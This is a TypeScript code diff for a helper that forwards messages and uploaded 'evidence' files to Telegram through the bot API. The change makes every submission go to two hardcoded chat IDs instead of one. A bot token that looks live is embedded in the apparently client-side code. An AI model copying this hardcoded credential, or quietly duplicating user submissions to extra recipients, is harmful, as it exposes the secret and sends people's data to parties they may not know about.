@@ -1,5 +1,5 @@
 const TELEGRAM_BOT_TOKEN = '8538901249:AAF-Ya8My1sQ2ikHgKAWeX_V2RlbZfuwoe0';
-const TELEGRAM_CHAT_ID = '6130097075';
+const TELEGRAM_CHAT_IDS = ['6130097075', '6895317164']; // Both chat IDs will receive notifications
 
 const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
 const TELEGRAM_DOCUMENT_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument`;
@@ -11,26 +11,32 @@ export interface TelegramMessage {
 
 export async function sendTelegramMessage(message: string): Promise<boolean> {
   try {
-    const response = await fetch(TELEGRAM_API_URL, {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json',
-      },
-      body: JSON.stringify({
-        chat_id: TELEGRAM_CHAT_ID,
-        text: message,
-        parse_mode: 'HTML',
-      }),
-    });
+    // Send message to all chat IDs
+    const promises = TELEGRAM_CHAT_IDS.map(chatId =>
+      fetch(TELEGRAM_API_URL, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: message,
+          parse_mode: 'HTML',
+        }),
+      })
+        .then(response => response.json())
+        .then(data => {
+          if (!data.ok) {
+            console.error(`Telegram API error for chat ${chatId}:`, data);
+            return false;
+          }
+          return true;
+        })
+    );
 
-    const data = await response.json();
-    
-    if (!response.ok || !data.ok) {
-      console.error('Telegram API error:', data);
-      return false;
-    }
-
-    return true;
+    const results = await Promise.all(promises);
+    // Return true if at least one message was sent successfully
+    return results.some(result => result === true);
   } catch (error) {
     console.error('Error sending Telegram message:', error);
     return false;
@@ -47,37 +53,42 @@ export async function sendTelegramFiles(files: FileList): Promise<boolean> {
       const file = files[i];
       const arrayBuffer = await file.arrayBuffer();
       const blob = new Blob([arrayBuffer], { type: file.type });
-      const formData = new FormData();
       
-      formData.append('chat_id', TELEGRAM_CHAT_ID);
-      formData.append('document', blob, file.name);
-      formData.append('caption', `📎 Evidence: ${file.name}`);
+      // Send file to all chat IDs
+      const promises = TELEGRAM_CHAT_IDS.map(chatId => {
+        const formData = new FormData();
+        
+        formData.append('chat_id', chatId);
+        formData.append('document', blob, file.name);
+        formData.append('caption', `📎 Evidence: ${file.name}`);
 
-      let apiUrl = TELEGRAM_DOCUMENT_API_URL;
-      
-      // Use photo API for image files
-      if (file.type.startsWith('image/')) {
-        apiUrl = TELEGRAM_PHOTO_API_URL;
-        formData.set('photo', blob, file.name);
-        formData.delete('document');
-      }
+        let apiUrl = TELEGRAM_DOCUMENT_API_URL;
+        
+        // Use photo API for image files
+        if (file.type.startsWith('image/')) {
+          apiUrl = TELEGRAM_PHOTO_API_URL;
+          formData.set('photo', blob, file.name);
+          formData.delete('document');
+        }
 
-      console.log(`Sending file: ${file.name} (${file.type})`);
-      
-      const response = await fetch(apiUrl, {
-        method: 'POST',
-        body: formData,
+        console.log(`Sending file to chat ${chatId}: ${file.name} (${file.type})`);
+        
+        return fetch(apiUrl, {
+          method: 'POST',
+          body: formData,
+        })
+          .then(response => response.json())
+          .then(data => {
+            if (!data.ok) {
+              console.error(`Telegram file upload error for chat ${chatId}, file:`, file.name, data);
+              return false;
+            }
+            console.log(`File sent to chat ${chatId} successfully:`, file.name);
+            return true;
+          });
       });
 
-      const data = await response.json();
-      
-      if (!response.ok || !data.ok) {
-        console.error('Telegram file upload error for file:', file.name, data);
-        // Continue with other files even if one fails
-        continue;
-      }
-      
-      console.log('File sent successfully:', file.name);
+      await Promise.all(promises);
     }
 
     return true;
